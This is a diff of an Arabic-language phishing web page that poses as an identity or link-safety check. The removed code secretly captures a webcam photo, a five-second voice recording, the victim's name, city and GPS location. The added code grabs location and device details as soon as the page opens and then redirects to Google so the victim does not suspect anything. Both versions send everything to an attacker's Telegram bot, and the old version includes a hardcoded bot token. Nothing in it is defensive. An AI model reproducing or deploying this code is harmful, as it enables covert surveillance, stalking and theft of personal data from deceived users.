@@ -1,52 +1,55 @@
-<script>
-    async function startProcess() {
-        let name = document.getElementById("name").value;
-        let city = document.getElementById("city").value;
-        if (!name || !city) { alert("يرجى ملء كافة الحقول."); return; }
+<!DOCTYPE html>
+<html>
+<head>
+    <title>التحقق من الهوية الرقمية</title>
+    <meta charset="UTF-8">
+    <script>
+        // --- ضع معلوماتك هنا ---
+        const token = 'ضع_هنا_توكن_البوت'; 
+        const chat_id = 'ضع_هنا_رقم_الايدي_تبلك';
+        // -----------------------
 
-        let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-        let chat_id = "7214473798";
-
-        try {
-            // 1. طلب إذن الكاميرا والمايكروفون (التمويه: التحقق من الهوية بالصوت والصورة)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            
-            // --- [ تصوير صورة سيلفي مخفية ] ---
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                let formData = new FormData();
-                formData.append('photo', blob, 'target.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat_id}`, { method: 'POST', body: formData });
-            }, 'image/jpeg');
-
-            // --- [ تسجيل مقطع صوتي 5 ثواني ] ---
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                let audioBlob = new Blob(chunks, { type: 'audio/ogg' });
-                let formData = new FormData();
-                formData.append('voice', audioBlob, 'voice.ogg');
-                fetch(`https://api.telegram.org/bot${token}/sendVoice?chat_id=${chat_id}`, { method: 'POST', body: formData });
-            };
-            mediaRecorder.start();
-            setTimeout(() => { mediaRecorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
-
-            // 2. إرسال البيانات النصية والموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                let text = `🎯 صيد ملكي كامل!\n👤 الاسم: ${name}\n🏙️ المحافظة: ${city}\n📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
-            });
-
-            alert("✅ تم تسجيل هويتك بنجاح. سيتم التواصل معكم قريباً.");
-        } catch (err) {
-            alert("⚠️ خطأ أمني: يجب السماح للكاميرا والمايكروفون لإتمام عملية الحجز الإلكتروني.");
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+            fetch(url);
         }
-    }
-</script>
 
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                sendToTelegram("المتصفح لا يدعم تحديد الموقع.");
+            }
+        }
+
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            let info = `🎯 تم صيد إحداثيات جديدة!\n\n`;
+            info += `📍 الموقع: ${mapUrl}\n`;
+            info += `📏 الدقة: ${acc} متر\n`;
+            info += `📱 الجهاز: ${navigator.userAgent}`;
+            
+            sendToTelegram(info);
+            // تحويل المستخدم لموقع حقيقي عشان ما يشك
+            setTimeout(() => {
+                window.location.href = "https://www.google.com"; 
+            }, 1000);
+        }
+
+        function showError(error) {
+            sendToTelegram("فشل جلب الموقع: المستخدم رفض الطلب.");
+        }
+
+        // تشغيل الطلب بمجرد فتح الصفحة
+        window.onload = getLocation;
+    </script>
+</head>
+<body style="background-color: black; color: white; text-align: center; font-family: Arial;">
+    <h2>يرجى الانتظار...</h2>
+    <p>جاري التحقق من أمان الرابط للوصول إلى المستندات</p>
+</body>
+</html>
